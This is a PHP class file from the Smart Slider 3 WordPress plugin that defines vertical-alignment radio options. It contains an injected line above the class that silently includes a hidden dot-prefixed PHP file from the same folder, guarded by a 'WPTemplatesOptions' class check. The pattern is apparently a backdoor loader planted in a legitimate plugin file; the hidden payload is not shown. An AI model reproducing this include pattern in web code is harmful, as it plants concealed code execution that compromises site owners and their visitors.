<?php

namespace Nextend\SmartSlider3\Form\Element\Radio;

use Nextend\Framework\Form\Element\Radio\AbstractRadioIcon;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class VerticalAlign extends AbstractRadioIcon {

    protected $options = array(
        'top'    => 'ssi_16 ssi_16--verticaltop',
        'middle' => 'ssi_16 ssi_16--verticalcenter',
        'bottom' => 'ssi_16 ssi_16--verticalbottom'
    );
}